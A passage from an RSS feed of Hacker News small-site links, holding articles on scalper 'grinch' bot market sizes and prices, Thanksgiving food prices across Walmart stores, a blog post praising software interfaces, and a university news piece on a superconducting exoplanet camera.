<li><a href="#grinch-bots-in-other-industries">Grinch Bots Are Increasingly Popular In Other Industries</a></li>
<li><a href="#grinch-bots-cost-10000-dollars">The Leading Grinch Bots Are Now Being Sold for Almost $10,000</a></li>
<li><a href="#what-holiday-deals-will-grinch-bots-target-2020">What Holiday Merchandise Will Grinch Bots Target in 2020?</a></li>
</ul>

<h2>What Are Grinch Bots?</h2>
<p>Grinch bots, otherwise known as scalper bots, are software programs built to rapidly purchase scarce goods from websites before humans have the chance to do so. In other words, they automate the checkout process on eCommerce websites. Some grinch bots are programmed and owned by individual hackers. Others, like those mentioned below, are built and sold to consumers known as 'botters.'</p>
<p>The typical features found in grinch bots are: </p><div>
<div>
<ul>
<li>Retailer website compatibility</li>
<li>Captcha solvers</li>
<li>Automated checkout</li>
<li>Restock checking</li>
<li>Proxy integrations</li>
<li>Mobile applications</li>
<li>Customer support</li>
</ul>
</div>
</div>
<p>Botters use technologies in addition to the bots to scalp merchandise. The two most common are proxies and servers. Proxies, offered by companies like <a rel="nofollow noopener" target="_blank" title="Oculus" href="https://oculusproxies.com/index">Oculus</a> and <a rel="nofollow noopener" target="_blank" title="Surge" href="https://www.surgeproxies.com/">Surge</a>, are entered into the bots so that each checkout can use a unique IP address. Servers, managed by companies like <a rel="nofollow noopener" target="_blank" title="Amazon Web Services" href="https://aws.amazon.com/">Amazon Web Services</a> or <a rel="nofollow noopener" target="_blank" title="10xServers" href="https://10xservers.com/">10xServers</a>, are used to increase bot speed. Botters host virtual servers in the same locations as the websites they are botting to reduce the physical distance that the data needs to travel.</p>
<h2>How Do Grinch Bots Work?</h2>
<p>When botters purchase their bot, they program it with their personal information – shipping &amp; billing addresses, credit card info, usernames &amp; passwords. The botters' proxies are also added to the bot.</p>
<p>In anticipation of a sale, botters enter the specific merchandise they hope to purchase from a given retailer. As you can see below, these are stored as tasks in the software.</p>
<div>
<p><img alt="Cybersole task screenshot" src="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/prismbot-tasks" srcset="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/prismbot-tasks 1x, https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_2.0,f_auto,h_1600,q_auto,w_1600/v1/software/prismbot-tasks 2x">
</p>
</div>
<p>Once the sale goes live on the target retailer website, the bot begins the checkout process. Botters can manually complete any necessary actions that the retailer requires during checkout, such as completing a CAPTCHA.</p>
<h2>Grinch Bots Will Purchase Over $100 Million of Sneakers During the 2020 Holidays</h2>
<p>Grinch bots will purchase over $100 million of sneakers during the 2020 holidays. This is consistent with the current size of the U.S. sneaker resale market, which is <a rel="nofollow noopener" target="_blank" title="estimated at $2 billion" href="https://finance.yahoo.com/news/global-sneaker-resale-market-could-reach-30-billion-by-2030-cowen-191003371.html">estimated at $2 billion</a>.</p>
<p>To calculate this figure, we completed a bottoms-up analysis using publicly available data shared by the bots. Many, but not all of the bots, share their transaction volume for each successful sale on Twitter. Cybersole's <a rel="nofollow noopener" target="_blank" title="Twitter account" href="https://twitter.com/Cybersole">Twitter account</a> is a good example, where you can find several posts a month celebrating the purchase of thousands of pairs of shoes.</p>
<p>The estimated 2020 holiday sales of the seven bots below is $70 million. This does not include sales from several other leading bots that do not publicly share their transaction volumes.</p>
<div>
<div>
<div>
<table><thead><tr><th colspan="" rowspan="">Bot</th><th colspan="" rowspan="">Est. Monthly Transactions</th><th colspan="" rowspan="">Est. Monthly Sales</th><th colspan="" rowspan="">Est. Holiday Sales</th><th colspan="" rowspan="">Annual Run Rate</th></tr></thead><tbody><tr><td colspan="" rowspan="">Kodai</td><td colspan="" rowspan="">50,000</td><td colspan="" rowspan="">$10 million</td><td colspan="" rowspan="">$24 million</td><td colspan="" rowspan="">$120 million</td></tr><tr><td colspan="" rowspan="">Cybersole</td><td colspan="" rowspan="">45,000</td><td colspan="" rowspan="">$9 million</td><td colspan="" rowspan="">$22 million</td><td colspan="" rowspan="">$108 million</td></tr><tr><td colspan="" rowspan="">Prism</td><td colspan="" rowspan="">25,000</td><td colspan="" rowspan="">$5 million</td><td colspan="" rowspan="">$12 million</td><td colspan="" rowspan="">$60 million</td></tr><tr><td colspan="" rowspan="">Project Destroyer</td><td colspan="" rowspan="">15,000</td><td colspan="" rowspan="">$3 million</td><td colspan="" rowspan="">$7.2 million</td><td colspan="" rowspan="">$36 million</td></tr><tr><td colspan="" rowspan="">Polaris</td><td colspan="" rowspan="">5,000</td><td colspan="" rowspan="">$1 million</td><td colspan="" rowspan="">$2.4 million</td><td colspan="" rowspan="">$12 million</td></tr><tr><td colspan="" rowspan="">AIO Bot</td><td colspan="" rowspan="">5,000</td><td colspan="" rowspan="">$1 million</td><td colspan="" rowspan="">$2.4 million</td><td colspan="" rowspan="">$12 million</td></tr><tr><td colspan="" rowspan=""><strong>Total</strong></td><td colspan="" rowspan=""><strong>145,000</strong></td><td colspan="" rowspan=""><strong>$29 million</strong></td><td colspan="" rowspan=""><strong>$70 million</strong></td><td colspan="" rowspan=""><strong>$348 million</strong></td></tr></tbody></table>
</div>
</div>

</div>
<h2>Grinch Bots Are Increasingly Popular In Other Industries</h2>
<p>While bots have the deepest penetration in footwear, they are becoming increasingly popular in several other industries. There are several recent high-profile reports of bots outdueling humans to secure valuable in-demand merchandise, for example: </p><div>
<div>
<ul>
<li>In November, resellers used bots to purchase the majority of PlayStation 5s from top online retailers like GAME, John Lewis and Tesco (<a rel="nofollow noopener" target="_blank" title="source" href="https://metro.co.uk/2020/11/20/ps5-retail-websites-crashed-due-to-scalper-bots-13627423/#:~:text=It's%20believed%20that%20scalpers%20were,each%20other%20for%20late%20deliveries.">source</a>)</li>
<li>In September, resellers used bots to purchase the majority of Nvidia's RTX3080 video card (<a rel="nofollow noopener" target="_blank" title="source" href="https://www.extremetech.com/gaming/315210-resellers-used-bots-to-dominate-the-rtx-3080-launch">source</a>)</li>
<li>In April, resellers used bots to exacerbate shortages of the Nintendo Switch (<a rel="nofollow noopener" target="_blank" title="source" href="https://www.ign.com/articles/nintendo-switch-shortages-exacerbated-by-resellers-using-auto-buying-bots">source</a>)</li>
</ul>
</div>
</div>
<p>One of the largest online forums for botters is Reddit, and more specifically the community <a rel="nofollow noopener" target="_blank" title="r/shoebots" href="https://www.reddit.com/r/shoebots/">r/shoebots</a>. While this community started out focused on shoes, many recent threads are about CPUs, electronics, sports cards, and video games. As you can see below, the community has grown exponentially as botting has grown in popularity. It started 2020 at 9,630 members and has 22,400 members as of November 21, 2020.</p>
<div>
<p><img alt="r/shoebots reddit user growth over time" src="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/rshoebots-user-growth" srcset="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/rshoebots-user-growth 1x, https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_2.0,f_auto,h_1600,q_auto,w_1600/v1/software/rshoebots-user-growth 2x">
</p>
</div>
<p>The sneaker market and COVID-19 are two of the largest catalysts of grinch bot adoption. COVID-19 impacted the market in two ways –&nbsp;it increased unemployment, and shifted retail spend online. These forces led to more individuals looking for a new source of income online.</p>
<p>Bots have also begun advertising their ability to operate on websites outside of the footwear industry. On November 12, Prism <a rel="nofollow noopener" target="_blank" title="announced" href="https://twitter.com/PrismAIO/status/1326920747625885698">announced</a> that its bot works on Walmart.com. In fact, there are several bots that work on both <a rel="nofollow noopener" target="_blank" title="Target and Walmart's websites" href="https://www.reddit.com/r/shoebots/comments/jyrwnb/best_walmart_and_target_bot_for_mac/">Target and Walmart's websites</a>. Cybersole's website advertises the ability to use its bot on over 270 websites.</p>
<h2>The Leading Grinch Bots Are Now Being Sold for Almost $10,000</h2>
<p>The market for grinch bots has become increasingly competitive as more software products have entered the market. However, finding and purchasing a copy of the best bots is difficult –&nbsp;bot creators typically limit the number of instances they sell in an effort to prevent their bots from becoming too popular, and obsolete.</p>
<p>As a result, many of the top bots must be purchased through resale themselves. The bot resale website BotBroker.io has sold over 31,000 bots. The pricing data below was recorded from its website in November 2020.</p>
<div>
<div>
<div>
<table><thead><tr><th colspan="" rowspan="">Bot</th><th colspan="" rowspan="">Last Sale Price</th><th colspan="" rowspan="">Bot Creation Date</th></tr></thead><tbody><tr><td colspan="" rowspan="">Wrath</td><td colspan="" rowspan="">$8,299</td><td colspan="" rowspan="">February, 2018</td></tr><tr><td colspan="" rowspan="">CyberAIO</td><td colspan="" rowspan="">$5,600</td><td colspan="" rowspan="">April, 2016</td></tr><tr><td colspan="" rowspan="">Prism</td><td colspan="" rowspan="">$3,998</td><td colspan="" rowspan="">October, 2018</td></tr><tr><td colspan="" rowspan="">SwftAIO</td><td colspan="" rowspan="">$3,750</td><td colspan="" rowspan="">January, 2019</td></tr><tr><td colspan="" rowspan="">Polaris</td><td colspan="" rowspan="">$3,300</td><td colspan="" rowspan="">November, 2019</td></tr><tr><td colspan="" rowspan="">Balko</td><td colspan="" rowspan="">$2,400</td><td colspan="" rowspan="">August, 2018</td></tr><tr><td colspan="" rowspan="">MekAIO</td><td colspan="" rowspan="">$2,400</td><td colspan="" rowspan="">October, 2020</td></tr><tr><td colspan="" rowspan="">Nebula</td><td colspan="" rowspan="">$2,399</td><td colspan="" rowspan="">March, 2018</td></tr><tr><td colspan="" rowspan="">TohruAIO</td><td colspan="" rowspan="">$2,065</td><td colspan="" rowspan="">October, 2019
</td></tr></tbody></table>
</div>
</div>

</div>
<p>Wrath is currently the most expensive bot on BotBroker.io. As you can see below, its price has been steadily increasing the past year.</p>
<div>
<p><img alt="Wrath bot price over time" src="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/wrath-price-over-time" srcset="https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_1.0,f_auto,h_1600,q_auto,w_1600/v1/software/wrath-price-over-time 1x, https://res.cloudinary.com/softwarepundit/image/upload/c_limit,dpr_2.0,f_auto,h_1600,q_auto,w_1600/v1/software/wrath-price-over-time 2x">
</p>
</div>
<h2>What Holiday Merchandise Will Grinch Bots Target in 2020?</h2>
<p>The development of bots in the sneaker industry and COVID-19 mean that the holiday season of 2020 will see a record level of grinch bot transactions. The merchandise categories that will see the greatest bot transaction volume will be: </p><div>
<div>
<ul>
<li>Clothing</li>
<li>Collectibles</li>
<li>Computers</li>
<li>Electronics</li>
<li>Gaming</li>
<li>Sneakers</li>
<li>Toys</li>
</ul>
</div>
</div>
<p>In addition, resellers will almost certainly target flash sales of any high-demand item. Botters have formed 'cook groups' on Discord, where they share the latest information about promising upcoming 'drops' and sales. These groups provide botters an additional advantage over the average consumer.</p>
<p>Unfortunately for these consumers, it's likely that they will be forced to pay a significant premium to purchase the hottest items of the 2020 holiday season. It's hard to compete with the botters and their bots.</p>
</div></div>]]>
            </description>
            <link>https://www.softwarepundit.com/industry-research/grinch-bots-steal-holiday-deals</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202140</guid>
            <pubDate>Tue, 24 Nov 2020 19:35:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Thanksgiving Dinner Costs in Every State]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201889">thread link</a>) | @bingdig
<br/>
November 24, 2020 | https://www.viscachadata.com/research/thanksgiving-prices | <a href="https://web.archive.org/web/*/https://www.viscachadata.com/research/thanksgiving-prices">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5f288d06b11c6d4682052caa" id="sections">
  
    <section data-section-id="5f288d06b11c6d4682052cae" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
      &quot;imageOverlayOpacity&quot;: 0.15,
      &quot;video&quot;: {
        &quot;playbackSpeed&quot;: 0.5,
        &quot;filter&quot;: 1,
        &quot;filterStrength&quot;: 0,
        &quot;zoom&quot;: 0
      },
      &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
      &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
      &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
      &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
      &quot;contentWidth&quot;: &quot;content-width--medium&quot;,
      &quot;sectionTheme&quot;: &quot;white&quot;,
      &quot;sectionAnimation&quot;: &quot;none&quot;,
      &quot;backgroundMode&quot;: &quot;image&quot;
    }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5fb44bf0d244e425af400962"><div><div><div data-block-type="2" id="block-e2f45a91e4089e8eb8c0"><div><p>How do the prices of Thanksgiving dinner ingredients vary across the country? Regional differences in cost and competition in addition to price discrimination by retailers can cause the same products to cost very different amounts to consumers depending on where they’re shopping. Viscacha Data’s granular retail data captures store-level prices for over 4,600 Walmart locations nationwide, helping answer this question.</p><p>Using a standard set of Thanksgiving dinner foods, we picked the most common products and calculated average prices by state. The cost of these products, based on the <a href="https://www.fb.org/newsroom/farm-bureau-survey-thanksgiving-dinner-cost-rises-only-a-penny#:~:text=The%20American%20Farm%20Bureau%20Federation's,last%20year's%20average%20of%20%2448.90">American Farm Bureau’s</a> standard 10-person meal estimate, ranges from $47.88 to $50.15 for the 48 contiguous states.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605651800882_4479"><p>The majority of products’ prices varied little by state, with some like Great Value’s sweet potatoes having no price variation at all. To look at more granular price variance, we focus in on milk, the product in the Thanksgiving dinner list with by far the largest geographic differences:</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1605651800882_5711"><div><p>The price of a gallon of milk ranges from $0.65 to $4.19 across Walmart stores. This likely stems from differing forms of price control across states, where some have state milk commissions that regulate prices and others don’t. Evidently, the differences in milk prices are the largest driver of differences in Thanksgiving dinner prices, particularly explaining the high costs in Pennsylvania and Maine.</p><p>Finally, we looked at geographic price variance of hard apple cider - not part of the standard Thanksgiving dinner basket but a fall-themed accompaniment with interesting price patterns.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605651800882_9243"><div><p>The price of an Angry Orchard 6-pack of hard cider varies significantly by location, from $7.98 to $11.48. In many cases, prices are similar across locations in a given state but vary sharply from state-to-state, even those that are geographically close together like Indiana and Ohio. In a couple cases, price markups seem to occur in urban areas and their surroundings (e.g. Dallas and St. Louis). Overall, the geographic variation in prices suggests that alcohol purchases may be the largest source of state-by-state variation in average Thanksgiving bills.</p><p><br>To learn more about how Viscacha Data’s novel price and inventory data can monitor and predict consumer and retailer behavior at granular levels, <a href="https://www.viscachadata.com/contact"><strong>contact us</strong></a><strong>.</strong></p><h4>Products Used</h4><p>Thanksgiving dinner:</p><ul data-rte-list="default"><li><p>Butterball All Natural Young Turkey, Frozen, 10-16 lbs &amp; Butterball Farm-to-Family Frozen Young Turkey, No Antibiotics, 10 - 20.9 lb (averaged)</p></li><li><p>Hormel Boneless Half Ham, 3 lbs</p></li><li><p>Great Value Country Gravy Mix, 2.5 oz</p></li><li><p>Great Value Whole Kernel Corn, 12 oz</p></li><li><p>Great Value Fine Green Beans, 12 oz</p></li><li><p>Great Value Sweet Peas, 32 oz</p></li><li><p>Great Value Steamable Sweet Potatoes, 10 oz (2 units)</p></li><li><p>Great Value Mini Marshmallows Value Size, 16 oz</p></li><li><p>Pillsbury Crescent Rolls Original, 16 ct, 16 oz</p></li><li><p>Ocean Spray Jellied Cranberry Sauce, 14 Oz &amp; Ocean Spray Whole Berry Cranberry Sauce, 14 Oz (averaged)</p></li><li><p>Great Value Whole Milk, 1 Gallon, 128 Fl. Oz.</p></li><li><p>Great Value Whipped Heavy Cream, 6.5 oz</p></li><li><p>LIBBY'S® Easy Pumpkin Pie Mix 30 oz.</p></li><li><p>Pillsbury Refrigerated Pie Crusts, 2 Ct, 14.1 oz Box</p></li></ul><p>Hard cider:</p><ul data-rte-list="default"><li><p>Angry Orchard Crisp Apple Hard Cider, 6 pack, 12 fl oz</p></li></ul></div></div></div></div></div></div>

        

        
          
        
        
          
        
      </div>

      
    </div>
  
</article>

</div>
    </div>
  </div>
</section>

  
</article>

          
          
            

          
          
        
      </div></div>]]>
            </description>
            <link>https://www.viscachadata.com/research/thanksgiving-prices</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201889</guid>
            <pubDate>Tue, 24 Nov 2020 19:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why I Love Interfaces]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201818">thread link</a>) | @SmooL
<br/>
November 24, 2020 | https://lucassimpson.com/blog/2020-11-20/why-I-love-interfaces/ | <a href="https://web.archive.org/web/*/https://lucassimpson.com/blog/2020-11-20/why-I-love-interfaces/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog-post"><p>Ahhh, interfaces! Also known as APIs / protocols / behaviours / your-favorite-languages-jargon-term-here. The source of plenty of pain, much rejoicing, and far too much discussion. I plan on contributing, here and now, to that third category. </p> <p>Why do we use interfaces? People will usually give you the standard reasons: it's easier to test, it enforces boundaries and seperation of concers, it decouples components. All of these are great, but none of those are my <em>favorite</em> reason to use interfaces. </p> <p>I love interfaces because they protect me from your shitty code.</p> <p>Did you use 13 spinlocks, all beautifully choreographed to keep 7 seperate maps in sync? Did you start multiple background threads, which all poll some resource far too frequently in a desparate attempt to stay up to date? Is your codes control flow best viewed in the fourth dimension? Maybe you really went out there and started using the <a href="http://antipatterns.com/lavaflow.htm">lava design pattern?</a>. Guess what, I don't care!</p> <p>Let me tell you a story. Junior Dev Dave joins a new software team, learns the basics of the code base, and instead of just fixing &amp;&amp;/|| improving other parts, it's now time for him to create his first component from scratch. Does he immediately dive into it and start experimenting with various implementations? NO! Senior Dev Sarah tells him to first specify the <em>contract</em> that this new component will have with the rest of the codebase. She then spends quality time with him to make sure it's a good one, and then promplty fucks off and repeats this entire allegory with someone else. Senior Dev Sarah does this with confidence, because the only part of her application that really matters, the interface, is done! Junior Dev Dave is free to play in his little sandbox in the corner and do whatever he likes! </p> <p>There's an implicit assumption here that whatever interface Junior Dev Dave comes up with will actually work. I think that's a safe assumption; anyone who's a decent enough programmer knows that making things work is <em>not</em> the hard part. The hard part is ensuring, as the software grows, that with added new features, complexity grows as close as possible to a factor of <code>O(N)</code> instead of <code>O(N^2)</code>. How do you do that? You guessed it, <em>interfaces</em>.</p> <p>A smart person once said "Good abstraction is as little abstraction as possible". Notice they didn't say <em>no</em> abstraction. Interfaces are the dividing walls, the geopolitical barriers, and the defensive design pattern you've been wanting ever since you took a look at your teammates idea of "good" implementation and thought to yourself "wtf". So use them; hell, abuse them. As long as it's all hidden behind a good interface, it's all the same to me. </p> <p><em>"Well then, get your shit together. Get it all together. And put it in a backpack. All your shit. So it’s together. And if you gotta take it somewhere, take it somewhere, you know, take it to the shit store and sell it… Or put it in a shit museum, I don’t care what you do, you just gotta get it together. And then put it behind an interface"</em> -Morty, adapted</p></div></div>]]>
            </description>
            <link>https://lucassimpson.com/blog/2020-11-20/why-I-love-interfaces/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201818</guid>
            <pubDate>Tue, 24 Nov 2020 19:05:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A new superfast exoplanet camera]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25201817">thread link</a>) | @finphil
<br/>
November 24, 2020 | https://nuadox.com/post/635693409202536448/novel-exoplanet-camera | <a href="https://web.archive.org/web/*/https://nuadox.com/post/635693409202536448/novel-exoplanet-camera">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="635693409202536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/635693409202536448/novel-exoplanet-camera"><h2>A new superfast exoplanet camera</h2></a>
                                <figure data-orig-height="1057" data-orig-width="1920"><img src="https://64.media.tumblr.com/51150d52a0234fec8b7b74eb000dbd40/40229b4b844f5ab1-9d/s1280x1920/801ebf594900e52284fa80ea3c1c36c485264928.jpg" data-orig-height="1057" data-orig-width="1920" width="1280" height="705" alt="image"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.news.ucsb.edu%2Fcontact-us&amp;t=N2YyNmIxOTBlNjg0MTg3MWRmOWJkODcyMTA1NDViOTlkNjlmY2VmNixtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">Harrison Tasoff</a> , <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.ucsb.edu%2F&amp;t=Y2U4M2Y0M2UzZTZiYmEzMmJjMGQ0ZjBhYzlkMzVmYWFmZTFhMzYxNSxtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">UC Santa Barbara</a> -</b></p><p>In the years since astronomers discovered the first exoplanet — a planet that orbits a star outside the solar system — more than 4,000 have been observed. Usually, their presence is given away by the slight effects they have on their parent stars, which vastly outshine them. For a decade and half, scientists have been trying to image exoplanets directly, but the Earth’s atmosphere presents a major impediment when they attempt to leverage large ground-based telescopes.</p><p>Now, a team of U.S. and Japanese scientists and engineers that includes researchers at UC Santa Barbara have developed a new exoplanet-hunting camera. Deployed at the Subaru Telescope on Maunakea, Hawai’I, the device is the world’s largest superconducting camera by pixel count and will pave the way for direct imaging of extra-solar planets in the near future. An instrument paper appearing in Publications of the Astronomy Society of the Pacific announced the new device to the astronomical community.</p><p>Constructed by researchers in the lab of Professor <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.physics.ucsb.edu%2Fpeople%2Fbenjamin-mazin&amp;t=YjM3YTkxYjUyY2UyNmY5MWY4YzFjYTE5MDdmYzg1ZTUxNDc1NjcxOCxtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">Ben Mazin</a>, the MKID Exoplanet Camera (MEC) uses Microwave Kinetic Inductance Detectors (MKIDs) to enable scientists to directly image exoplanets and disks around bright stars. The detector runs at a brisk 90 millikelvin — just a touch over absolute zero — and is the first permanently deployed superconducting camera that operates in the optical and near infrared spectrum.</p><figure data-orig-height="897" data-orig-width="1000"><img src="https://64.media.tumblr.com/a0d9edf6defa86e4fd44ca29642a9626/40229b4b844f5ab1-b8/s1280x1920/1cb9e615f72e7e1bf5d54e1c4d37129435105c2e.jpg" data-orig-height="897" data-orig-width="1000" width="1000" height="897" alt="image"></figure><p><i>Image: The 20440 pixel MKID device designed for MKID Exoplanet Camera is the highest pixel-count superconducting detector array at any wavelength. Credit: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.news.ucsb.edu%2F2020%2F020103%2Fhere-s-looking-you-mkid&amp;t=MGRmMDE1N2I1MzE2ZWE5MDE5MmQ3NzZiZjA3ZjliNTZjOTE0ODlmMixtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">Courtesy image</a>.</i><br></p><p>“In exoplanet direct imaging, you are attempting to image planets that are millions of times fainter than their parent stars,” said <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.physics.ucsb.edu%2Fpeople%2Fsarah-steiger&amp;t=NWVlY2NjOGIwZGYxODgzNGFlY2MxYWY2YzY1NTliMjk0OTMzZDE2MixtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">Sarah Steiger</a>, a doctoral student in the Mazin lab who worked on the MKID pipeline. “It’s the equivalent of trying to see a firefly next to a fully lit football stadium from a plane.</p><p>“What’s more, if you are doing this from the ground, you must look through Earth’s turbulent atmosphere,” she continued. This turbulence is what causes stars to twinkle in the night sky, and is a perennial headache to astronomers, distorting images and casting starlight on dim exoplanets.</p><p>“It’s a constant battle to prevent stray light from the star from completely overwhelming the planet,” said doctoral student <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fweb.physics.ucsb.edu%2F%7Ebmazin%2Fpeople%2Fgrads.html&amp;t=MjM4MWQ0NTJkMGY2YjUxY2U1N2Y1MmZlYTc3Yjg5NDg3MjE3NWZlYSxtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">Neelay Fruitwala</a>.</p><p>Modern observatories use adaptive optics to correct these distortions. The systems rely on rapid feedback loops and complex algorithms to bend a telescope’s mirror thousands of times per second in ways that counteract the effects of the atmosphere, enabling scientists to recover an image as though the telescope were in space.</p><p>“These very complicated adaptive optics systems let us discover planets like those in HR 8799, which is a system with four planets all above Jupiter’s mass orbiting in it,” said Mazin. But they can also scatter light, which obscures faint exoplanets. “We found that just using adaptive optics by itself was only going to find us a handful of planets — namely those still glowing with the heat of their formation — which are just not that common in our stellar neighborhood.”</p><p>Another advantage of MKIDs lies in their ability to determine the energy of each photon that hits the detector. “This allows us not only to determine a planet’s brightness,” Steiger said, “but also to get a spectrum (the brightness as a function of energy), which can reveal additional information about an exoplanet’s properties, such as its age, mass and potentially atmospheric composition.”</p><p>More advanced detectors employ a coronagraph, which blocks out some of the light from the host star so scientists can better discern the light reflecting off the planet itself. This is important for imaging nearby systems, most of which aren’t particularly young. However, getting the best performance from such a setup requires extremely good adaptive optics.</p><p>“These instruments are sort of hitting a wall right now,” Mazin said. “They can block out the light from the star by about a factor of a million, but the problem is that most planets are more like a billion times fainter than their parent star.”</p><p>One advantage of MKIDs over traditional cameras is that they are very fast. These detectors can read out data thousands of times per second, which are the speeds required to keep up with an adaptive optics system, Steiger explained. This allows an MKID to further clean up an image by communicating with the observatory’s adaptive optics system to remove some of the scattered and diffracted starlight. This pushes the limits of how faint an exoplanet can be imaged.</p><p>The MKID Exoplanet Camera should expand the range of exoplanets that astronomers can directly image to those near Earth. These are the most important because we can characterize them in greater detail, said coauthor Olivier Guyon, the project scientist in charge of the Subaru Coronagraphic Extreme Adaptive Optics (SCExAO) instrument.</p><p>The ultimate goal is to search for evidence of life, and the MEC is an important step in this journey. “We’re not going to be able to do that with Subaru, or with any of the current telescopes, because they’re just a bit too small,” Guyon said. “But we’re preparing for the next big step, which is to deploy exoplanet imaging cameras on larger telescopes such as the Thirty Meter Telescope. When those telescopes come online, the same technologies, the same camera, the same tricks will allow us to actually look for life.”</p><p>That said, there’s still a lot of work left to do, mostly on the MEC’s software and algorithms. The team received a large grant from the Heising-Simons Foundation to tackle this problem and further develop fast optical correction over the next few years. “We’re throwing every trick in the book at this,” Mazin said, “and we’re developing new tricks as well.”</p><p>The authors acknowledge the significant cultural role and reverence that the summit of Maunakea holds within the Hawaiian community and said they feel fortunate to have the opportunity to conduct observations from this mountain. The development of SCExAO was supported by JSPS; the Astrobiology Center of NINS, Japan; and the National Astronomical Observatory of Japan.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.news.ucsb.edu%2F2020%2F020103%2Fhere-s-looking-you-mkid&amp;t=MGRmMDE1N2I1MzE2ZWE5MDE5MmQ3NzZiZjA3ZjliNTZjOTE0ODlmMixtbzhUNk9leQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F635693409202536448%2Fnovel-exoplanet-camera&amp;m=0&amp;ts=1606438898">University of California, Santa Barbara</a></b></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/627551986964889600/50-new-exoplanets-identified-by-ai-from-previous">50 new exoplanets identified by AI from previous NASA data</a></p><p><a href="https://nuadox.com/post/188859348972/nasa-tess-exoplanets">NASA’s TESS spacecraft is finding hundreds of exoplanets – and is poised to find thousands more</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/exoplanet">exoplanet</a>
                                    
                                        <a href="https://nuadox.com/tagged/planet">planet</a>
                                    
                                        <a href="https://nuadox.com/tagged/space">space</a>
                                    
                                        <a href="https://nuadox.com/tagged/camera">camera</a>
                                    
                                        <a href="https://nuadox.com/tagged/optics">optics</a>
                                    
                                        <a href="https://nuadox.com/tagged/astronomy">astronomy</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/635693409202536448/novel-exoplanet-camera</link>
            <guid isPermaLink="false">hacker-news-small-sites-25201817</guid>
            <pubDate>Tue, 24 Nov 2020 19:05:57 GMT</pubDate>
        </item>
        <item>
            <title>
